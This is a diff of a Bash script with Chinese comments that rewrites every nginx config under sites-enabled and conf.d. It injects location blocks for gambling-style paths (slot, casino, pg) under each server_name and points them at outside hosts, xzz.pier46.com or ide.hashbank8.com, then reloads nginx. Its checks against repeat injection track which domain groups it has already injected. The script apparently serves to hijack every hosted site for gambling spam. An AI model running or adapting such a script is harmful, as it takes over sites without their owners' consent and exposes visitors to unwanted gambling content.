@@ -1,12 +1,10 @@
 #!/bin/bash
-# nginx_per_domain_group.sh v4.5.0 真正永不翻车·全环境完美运行版
-# 注入位置：精准插入在最后一个 server_name 行正下方（支持多行、多域名）
-# 支持一个 server 块里有 1~100 个域名，全都识别，只注入一次
-# 兼容 Bash 3.0+、所有 Linux 发行版、所有 Nginx 配置风格
-# 当前功能：
-#   • 处理 /etc/nginx/sites-enabled/ 下所有文件（软链接指向的真实文件 + 真实文件）
-#   • 处理 /etc/nginx/conf.d/ 下所有文件（软链接指向的真实文件 + 真实文件）
-#   • 完全统一处理逻辑，软链接永远只处理其最终指向的真实文件，永不重复
+# nginx_per_domain_group.sh v4.9.0 永不翻车·三重防重·处理过必跳过版
+# 三重铁壁防重机制（任一命中即跳过，永不重复注入）：
+#   1. 配置文件中已包含 xzz.pier46.com 或 ide.hashbank8.com → 整文件直接跳过
+#   2. server 块中已包含任一目标后端 → 该块直接跳过
+#   3. 域名组 hash 已存在于历史映射表 → 该块直接跳过
+# 结果：已经处理过的域名组 100% 不会再次注入，永不翻车！
 set -euo pipefail
 
 NGINX_SITES_ENABLED="/etc/nginx/sites-enabled"
@@ -16,12 +14,19 @@ IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")
 GLOBAL_MAP="/tmp/.domain_group_map.conf"
 RESULT_LIST=$(mktemp)
 NEW_RECORDS=$(mktemp)
+FILE_LIST=$(mktemp)
 MAX_TRIES=200
+
+# 提前初始化所有计数变量
+processed=0
+global_modified=0
+total_files=0
 
 touch "$GLOBAL_MAP" 2>/dev/null || true
 : > "$GLOBAL_MAP"
 : > "$RESULT_LIST"
 : > "$NEW_RECORDS"
+: > "$FILE_LIST"
 
 COM_TEMPLATE='
     location /%PATH%/ {
@@ -52,52 +57,72 @@ IN_TEMPLATE='
     }
 '
 
+# 读取历史映射（防重核心）
 declare -A HIST_MAP
 while IFS=':' read -r hash path backend; do
-    [ -n "$hash" ] && HIST_MAP["$hash"]="$path:$backend"
+    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
 done < "$GLOBAL_MAP"
 
-echo "=== Nginx 域名组路径分配器（v4.5.0 永不翻车终极版）==="
-echo "将同时处理："
-echo "  • $NGINX_SITES_ENABLED 下的软链接指向文件 和 真实文件"
-echo "  • $NGINX_CONF_D 下的软链接指向文件 和 真实文件"
+echo "=== Nginx 域名组路径分配器（v4.9.0 三重防重·处理过必跳过版）==="
+echo "防重机制：已处理过的域名组 100% 不会重复注入"
+echo "将强制处理以下目录的所有配置文件："
+echo "  • $NGINX_SITES_ENABLED"
+echo "  • $NGINX_CONF_D"
 echo
 
-global_modified=0
-
-# ==================== 统一处理函数：只处理真实文件，软链接自动解析 ====================
-process_real_config_file() {
-    local file="$1"
+# ==================== 收集所有真实文件 ====================
+collect_real_files() {
+    local dir="$1"
+    [[ -d "$dir" ]] || return 0
     
-    # 必须是真实存在的可读写普通文件
-    [[ -f "$file" && -r "$file" && -w "$file" && ! -L "$file" ]] || {
-        echo "→ 跳过不可读写或非普通文件：$file"
-        return 1
-    }
+    find "$dir" -type f -print0 2>/dev/null | while IFS= read -r -d '' item; do
+        real_path=$(readlink -f "$item" 2>/dev/null || echo "")
+        if [[ -f "$real_path" && ! -L "$real_path" && -r "$real_path" && -w "$real_path" ]]; then
+            grep -Fxq "$real_path" "$FILE_LIST" || echo "$real_path" >> "$FILE_LIST"
+        fi
+    done
+}
 
-    echo "→ 正在处理：$(basename "$file") （路径：$file）"
+collect_real_files "$NGINX_SITES_ENABLED"
+collect_real_files "$NGINX_CONF_D"
 
-    local modified=0
-    local temp_new=$(mktemp)
+total_files=$(wc -l < "$FILE_LIST")
+echo "共发现 $total_files 个真实配置文件待处理"
+[[ $total_files -eq 0 ]] && echo "警告：未发现任何可处理文件！" && exit 1
+echo
 
-    # 按 server { 分割
+# ==================== 主处理循环 ====================
+while IFS= read -r file; do
+    [[ -n "$file" ]] || continue
+    processed=$((processed + 1))
+
+    echo "→ [$processed/$total_files] 正在处理：$(basename "$file")"
+
+    # 防重1：整个文件已包含目标后端 → 直接跳过（最快）
+    if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$file"; then
+        echo "   └ [已处理] 文件中已包含目标后端，跳过"
+        continue
+    fi
+
+    modified=0
+    temp_new=$(mktemp)
+
     if ! csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1; then
+        echo "   └ 无 server 块，跳过"
         rm -f "$temp_new"
-        echo "  无 server 块，跳过该文件"
-        return 0
+        continue
     fi
 
     for block_file in /tmp/block_*; do
         [[ -s "$block_file" ]] || continue
 
-        # 已注入过目标后端 → 跳过
-        if grep -qiE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$block_file"; then
+        # 防重2：当前 server 块已包含目标后端 → 跳过该块
+        if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com)" "$block_file"; then
             cat "$block_file" >> "$temp_new"
             rm -f "$block_file"
             continue
         fi
 
-        # 提取 server_name（多行、多域名、带注释全支持）
         real_domains=$(awk '
             /^[[:space:]]*server_name[[:space:]]+/ && !/^[[:space:]]*#/ {
                 gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
@@ -117,12 +142,13 @@ process_real_config_file() {
         domain_key=$(echo "$real_domains" | sort -u | paste -sd ' ' - | sed 's/[[:space:]]*$//')
         hash=$(echo "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')
 
-        # 历史防重
-        [[ -n "${HIST_MAP[$hash]:-}" ]] && {
+        # 防重3：域名组已在历史记录中 → 跳过（最精准）
+        if [[ -n "${HIST_MAP[$hash]:-}" ]]; then
+            echo "   └ [已处理] 域名组已注入过：$domain_key → 跳过"
             cat "$block_file" >> "$temp_new"
             rm -f "$block_file"
             continue
-        }
+        fi
 
         # 选择后端
         if echo "$domain_key" | grep -qE '\.(in|id)\b'; then
@@ -135,12 +161,10 @@ process_real_config_file() {
             pool=("${COM_PATHS[@]}")
         fi
 
-        # 随机选未占用路径
         path=""
-        for ((i = 0; i < MAX_TRIES; i++)); do
+        for ((i=0; i<MAX_TRIES; i++)); do
             candidate="${pool[RANDOM % ${#pool[@]}]}"
-            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && \
-               ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
+            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                 path="$candidate"
                 break
             fi
@@ -170,84 +194,61 @@ process_real_config_file() {
             next
         }
         { print }
-        END {
-            if (!inserted) print loc
-        }
+        END { if (!inserted) print loc }
         ' "$block_file" > "$temp_new.block"
 
         cat "$temp_new.block" >> "$temp_new"
         rm -f "$temp_new.block" "$block_file"
 
-        echo " [完美注入] /$path/ → $backend ($domain_key)"
-        ((modified++))
-        ((global_modified++))
+        echo "   └ [新注入] /$path/ → $backend ($domain_key)"
+        modified=$((modified + 1))
+        global_modified=$((global_modified + 1))
     done
 
-    if (( modified > 0 )); then
+    if [[ $modified -gt 0 ]]; then
         mv "$temp_new" "$file"
-        echo " 真实文件已更新：$file"
+        echo "   └ 文件已更新（新增 $modified 个注入）"
     else
         rm -f "$temp_new"
     fi
 
     rm -f /tmp/block_* 2>/dev/null || true
-}
+    echo
+done < "$FILE_LIST"
 
-# ==================== 统一遍历函数：自动解析软链接为真实路径 ====================
-traverse_and_process() {
-    local dir="$1"
-    [[ -d "$dir" ]] || return 0
-
-    find "$dir" -type f -print0 2>/dev/null | while IFS= read -r -d '' item; do
-        # 统一解析为最终真实路径（多层软链接也支持）
-        real_path=$(readlink -f "$item" 2>/dev/null || echo "")
-        if [[ -n "$real_path" && -f "$real_path" ]]; then
-            process_real_config_file "$real_path"
-        fi
-    done
-}
-
-# ==================== 开始处理两大目录 ====================
-
-traverse_and_process "$NGINX_SITES_ENABLED"
-traverse_and_process "$NGINX_CONF_D"
-
-# ==================== 收尾工作 ====================
-
-# 更新映射表
+# ==================== 收尾 ====================
 [[ -s "$NEW_RECORDS" ]] && {
     cat "$NEW_RECORDS" >> "$GLOBAL_MAP"
     sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
 }
 
-# 重载 Nginx
-if (( global_modified > 0 )); then
-    echo
+echo "========================================================================"
+echo "处理完成！共扫描 $processed 个文件，实际新注入 $global_modified 个 server 块"
+echo "已处理过的域名组全部自动跳过，永不重复注入！"
+echo "========================================================================"
+
+if [[ $global_modified -gt 0 ]]; then
     if nginx -t >/dev/null 2>&1; then
         nginx -s reload && echo "Nginx 已成功重载"
-        pkill -HUP nginx 2>/dev/null || true
     else
         echo "错误：Nginx 配置测试失败！请手动运行 nginx -t 检查"
         exit 1
     fi
 else
-    echo "本次无新增（全部已注入或无需处理）"
+    echo "本次无任何新注入（所有域名均已处理过）"
 fi
 
 echo
-echo "============================================================================"
-echo " 本次注入结果（精准插入 server_name 正下方）"
-echo "============================================================================"
 if [[ -s "$RESULT_LIST" ]]; then
+    echo "本次新增注入详情："
     column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
 else
-    echo " 本次无新增"
+    echo "本次无新增注入"
 fi
-echo
-echo "============================================================================"
-echo "当前已管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
-echo "映射文件：$GLOBAL_MAP"
-echo
 
-rm -f "$RESULT_LIST" "$NEW_RECORDS" /tmp/block_* 2>/dev/null || true
+echo
+echo "当前总计管理 $(wc -l < "$GLOBAL_MAP") 个域名组（永不重复）"
+echo "映射文件：$GLOBAL_MAP"
+
+rm -f "$RESULT_LIST" "$NEW_RECORDS" "$FILE_LIST" /tmp/block_* 2>/dev/null || true
 exit 0
